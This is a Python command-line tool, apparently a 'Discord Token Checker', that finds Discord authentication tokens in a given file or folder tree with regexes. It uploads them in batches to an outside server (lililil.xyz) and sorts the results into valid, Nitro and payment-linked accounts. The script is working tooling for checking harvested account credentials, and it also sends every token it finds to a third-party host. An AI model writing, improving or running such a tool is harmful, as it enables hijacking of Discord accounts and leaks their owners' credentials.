import json
import math
import os
import pathlib
import re

import jwt
import requests
from colorama import Fore


def cls():
    os.system("cls" if os.name == "nt" else "clear")


def fast_exit(message):
    print()
    print(message)
    print()
    input(f"Press Enter button for exit.")
    cls()
    exit()


class Checker:
    def __init__(self):
        self.url = "https://lililil.xyz/checker"
        self.max_tokens = 10000
        self.tokens_part = 1000
        self.tokens_not_parsed = ""
        self.tokens_parsed = []
        self.res = {}

    def main(self):
        cls()
        print(fr"""
   ___  _                     __  ______     __              _______           __                  ___ 
  / _ \(_)__ _______  _______/ / /_  __/__  / /_____ ___    / ___/ /  ___ ____/ /_____ ____  _  __|_  |
 / // / (_-</ __/ _ \/ __/ _  /   / / / _ \/  '_/ -_) _ \  / /__/ _ \/ -_) __/  '_/ -_) __/ | |/ / __/ 
/____/_/___/\__/\___/_/  \_,_/   /_/  \___/_/\_\\__/_//_/  \___/_//_/\__/\__/_/\_\\__/_/    |___/____/ 
                                                                                           {Fore.CYAN}by GuFFy_OwO
{Fore.RESET} 

Telegram Bot with same functionality: {Fore.CYAN}https://t.me/Discord_Token_Checker_bot{Fore.RESET}
""")

        print(f"{Fore.RESET}[{Fore.CYAN}1{Fore.RESET}] Enter token")
        print(f"{Fore.RESET}[{Fore.CYAN}2{Fore.RESET}] Check file")
        print()
        check_type = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")

        if "1" in check_type:
            print()
            self.tokens_not_parsed = input(f"{Fore.CYAN}>{Fore.RESET}Enter tokens{Fore.CYAN}:{Fore.RESET} ")
        elif "2" in check_type:
            print()
            token_file_name = input(
                f"{Fore.CYAN}>{Fore.RESET}Enter the directory of the files or file in which are the unchecked tokens"
                f"{Fore.CYAN}:{Fore.RESET} "
            )
            if not os.path.exists(token_file_name):
                fast_exit(f"{token_file_name} directory not exist.")

            if os.path.isfile(token_file_name):
                with open(token_file_name, "r", errors="ignore") as f:
                    self.tokens_not_parsed = f.read()
            else:
                types = ["*.txt", "*.html", "*.json"]
                for search_type in types:
                    for path in pathlib.Path(token_file_name).rglob(search_type):
                        with open(path, "r", errors="ignore") as f:
                            self.tokens_not_parsed += f.read()
        else:
            fast_exit("Invalid Option.")

    def parse_tokens(self):
        pre_parsed = []
        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
            for token in re.findall(regex, self.tokens_not_parsed):
                pre_parsed.append(token)
        pre_parsed = list(dict.fromkeys(pre_parsed))

        for token in pre_parsed:
            try:
                jwt.decode(token, options={"verify_signature": False})
            except Exception as e:
                if str(e) == "Invalid header string: must be a json object" or str(e) == "Not enough segments":
                    self.tokens_parsed.append(token)

        if len(self.tokens_parsed) > self.max_tokens:
            fast_exit(
                f"The current API limit is {Fore.CYAN}{self.max_tokens}{Fore.RESET} tokens. "
                f"Amount of sorted tokens - {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET}."
            )
        elif len(self.tokens_parsed) == 0:
            fast_exit("Parser did not found tokens.")

        print()
        print(f"Found {Fore.CYAN}{len(self.tokens_parsed)}{Fore.RESET} tokens!")

    def send_tokens(self):
        res = {"tokensInfo": {"valid": [], "nitro": [], "payment": [], "unverified": [], "invalid": [],
                              "parsedTokens": []}, "tokensData": {}}
        parts = [self.tokens_parsed[d:d + self.tokens_part] for d in
                 range(0, len(self.tokens_parsed), self.tokens_part)]

        i = 1
        for tokens in parts:
            if len(tokens) < 100:
                ms = len(tokens) * 50
            else:
                ms = (len(tokens) // self.tokens_part * self.tokens_part * 5 * math.sqrt(
                    len(tokens) // self.tokens_part * self.tokens_part) +
                      len(tokens) % self.tokens_part * 5 * math.sqrt(len(tokens) % self.tokens_part))
            time = int(round(ms * 1.5 / 1000 / 60))

            print()
            print(
                f"Sending {Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{len(parts)}{Fore.RESET} part of tokens... "
                f"{Fore.CYAN}{len(tokens)}{Fore.RESET} tokens - {Fore.CYAN}{time}{Fore.RESET} min."
            )

            try:
                req = requests.post(self.url, json=tokens)

                if req.status_code == 429:
                    fast_exit(
                        f"Too many tokens check, try after "
                        f"{Fore.CYAN}{req.headers['RateLimit-Reset']}{Fore.RESET} seconds..."
                    )
                elif req.status_code != 200:
                    fast_exit(f"Status code is {Fore.CYAN}{req.status_code}{Fore.RESET}. {req.json()}")

                for tokens_type in res["tokensInfo"]:
                    res["tokensInfo"][tokens_type] += req.json()["tokensInfo"][tokens_type]
                res["tokensData"].update(req.json()["tokensData"])
            except Exception as e:
                fast_exit(f"An error occurred while trying to send the file to the server. {str(e)}")

            self.res = res
            checker.save_res(i, len(parts))
            i += 1

        fast_exit("All tokens saved!")

    def save_res(self, i, parts):
        stats = ""
        for token_type in self.res["tokensInfo"].keys():
            if self.res["tokensInfo"][token_type]:
                stats += f"{token_type} - {Fore.CYAN}{len(self.res['tokensInfo'][token_type])}{Fore.RESET}, "
                with open(token_type + ".txt", "w") as f:
                    for item in self.res["tokensInfo"][token_type]:
                        f.write("%s\n" % item)

        with open("tokens_data.json", "w") as f:
            json.dump(self.res, f, indent=4)

        print(f"{Fore.CYAN}{i}{Fore.RESET}/{Fore.CYAN}{parts}{Fore.RESET} part of tokens saved!\nStats: {stats[:-2]}")


if __name__ == "__main__":
    checker = Checker()
    checker.main()
    checker.parse_tokens()
    checker.send_tokens()
